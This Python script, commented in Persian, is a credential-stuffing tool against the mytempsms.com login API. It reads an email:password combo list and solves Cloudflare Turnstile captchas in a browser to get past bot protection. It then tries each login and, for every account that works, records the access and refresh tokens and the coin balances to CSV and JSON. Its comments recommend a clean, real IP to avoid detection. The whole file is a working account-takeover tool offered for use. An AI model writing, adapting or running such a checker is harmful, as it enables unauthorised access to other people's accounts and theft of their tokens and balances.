#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
checker.py — چکر لاگین mytempsms.com  (نسخهٔ کامل)
==================================================
ورودی : یک کمبو لیست  email:password  (هر خط یک حساب)
خروجی : خروجی روی صفحه + نتایج در results.csv و results.json

روند برای هر حساب:
  1) توکن tazeٔ Turnstile از مرورگر گرفته می‌شود (بدون API key).
  2) درخواست لاگین به  POST /v5/auth/login/email  با {from,email,password,captchaToken}.
  3) اگر موفق بود: POST /v5/users/profile  و خواندن موجودی/توکن‌ها.

اجرا (روی ماشین با IP واقعی، ترجیحاً شبکهٔ کاربر):
    python3 checker.py combos.txt
    python3 checker.py combos.txt --workers 1
سرور لینوکسی بدون گرافیک:
    xvfb-run -a --server-args="-screen 0 1366x900x24" python3 checker.py combos.txt
"""

import argparse
import csv
import json
import os
import sys
import time
import urllib.request
import urllib.error

from captcha_solver import TurnstileSolver

LOGIN_URL = "https://america.receivesms.top/v5/auth/login/email"
PROFILE_URL = "https://america.receivesms.top/v5/users/profile"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")

HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "Origin": "https://mytempsms.com",
    "Referer": "https://mytempsms.com/",
    "User-Agent": UA,
}


# --------------------------------------------------------------------- #
def http_post(url, payload, token=None, timeout=25):
    """POST JSON و برگرداندن (status, dict|text)."""
    data = json.dumps(payload).encode()
    headers = dict(HEADERS)
    if token:
        headers["Authorization"] = "Bearer " + token
    req = urllib.request.Request(url, data=data, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read().decode()
            return r.status, _safe_json(body)
    except urllib.error.HTTPError as e:
        return e.code, _safe_json(e.read().decode())
    except Exception as e:
        return -1, {"error": str(e)}


def _safe_json(text):
    try:
        return json.loads(text)
    except Exception:
        return {"raw": text[:300]}


def parse_combos(path):
    """خواندن کمبو لیست: خطوط خالی و # نادیده گرفته می‌شوند."""
    combos = []
    with open(path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if ":" not in line:
                continue
            email, pw = line.split(":", 1)
            email, pw = email.strip(), pw.strip()
            if email and pw:
                combos.append((email, pw))
    return combos


# --------------------------------------------------------------------- #
def try_login(email, password, captcha_token):
    """یک تلاش لاگین. برمی‌گرداند: dict نتیجه."""
    status, j = http_post(LOGIN_URL, {
        "from": "mys",
        "email": email,
        "password": password,
        "captchaToken": captcha_token,
    })
    code = j.get("error_code")
    msg = j.get("msg", "")
    rec = {"email": email, "password": password, "status": status,
           "error_code": code, "msg": msg, "valid": False}

    if status == 200 and code == 0 and j.get("data"):
        data = j["data"]
        rec["valid"] = True
        rec["access_token"] = data.get("access_token", "")
        rec["refresh_token"] = data.get("refresh_token", "")
        rec["user_id"] = data.get("user_id") or data.get("id")
    else:
        # 4000 = Verification failed (کپچا) یا خطای اعتبارسنجی
        rec["reason"] = "captcha" if "erif" in msg or "驗證" in msg else "invalid_credentials"
    return rec


def fetch_profile(access_token):
    status, j = http_post(PROFILE_URL, {"type": "base"}, token=access_token)
    if status == 200 and j.get("data"):
        return j["data"]
    return None


# --------------------------------------------------------------------- #
def main():
    ap = argparse.ArgumentParser(description="mytempsms.com login checker")
    ap.add_argument("combos", help="مسیر کمبو لیست (email:password)")
    ap.add_argument("--browser", default="/usr/bin/chromium")
    ap.add_argument("--headless", action="store_true",
                    help="اجرای مرورگر بدون پنجره (روی IP تمیز توصیه نمی‌شود)")
    ap.add_argument("--out", default="results", help="پیشوند فایل خروجی")
    ap.add_argument("--delay", type=float, default=1.5,
                    help="ثانیه مکث بین حساب‌ها")
    ap.add_argument("--captcha-timeout", type=float, default=70,
                    help="ثانیه انتظار برای تولید توکن هر تلاش")
    ap.add_argument("--captcha-retries", type=int, default=3,
                    help="تعداد تلاش حل کپچا برای هر حساب")
    args = ap.parse_args()

    if not os.path.exists(args.combos):
        sys.exit("کمبو لیست پیدا نشد: %s" % args.combos)
    combos = parse_combos(args.combos)
    if not combos:
        sys.exit("کمبو لیست خالی است یا فرمت درست ندارد (email:password).")
    print("[i] %d حساب برای بررسی" % len(combos))

    solver = TurnstileSolver(browser_path=args.browser, headless=args.headless,
                             timeout=args.captcha_timeout)
    results = []
    try:
        for i, (email, pw) in enumerate(combos, 1):
            print("\n[%d/%d] %s" % (i, len(combos), email))
            token = solver.solve(retries=args.captcha_retries)
            if not token:
                rec = {"email": email, "password": pw, "valid": False,
                       "error_code": None, "msg": "no_captcha_token",
                       "reason": "captcha_unavailable"}
                results.append(rec)
                print("   -> کپچا حل نشد؛ رد شد")
                continue

            rec = try_login(email, pw, token)
            if rec["valid"]:
                prof = fetch_profile(rec["access_token"]) or {}
                rec["name"] = prof.get("name")
                rec["email_verified"] = prof.get("email_verified")
                rec["coins"] = prof.get("coins")
                rec["gold_coins"] = prof.get("gold_coins")
                print("   -> ✔ معتبر | موجودی: coins=%s gold=%s" %
                      (rec.get("coins"), rec.get("gold_coins")))
            else:
                print("   -> ✘ %s (%s)" % (rec.get("reason"), rec.get("msg")))
            results.append(rec)
            time.sleep(args.delay)
    finally:
        solver.close()

    valid = [r for r in results if r.get("valid")]
    with open(args.out + ".json", "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    cols = ["email", "password", "valid", "reason", "msg", "coins",
            "gold_coins", "name", "email_verified", "access_token"]
    with open(args.out + ".csv", "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=cols, extrasaction="ignore")
        w.writeheader()
        for r in results:
            w.writerow(r)

    print("\n===== خلاصه =====")
    print("بررسی‌شده: %d | معتبر: %d" % (len(results), len(valid)))
    print("خروجی: %s.csv / %s.json" % (args.out, args.out))


if __name__ == "__main__":
    main()
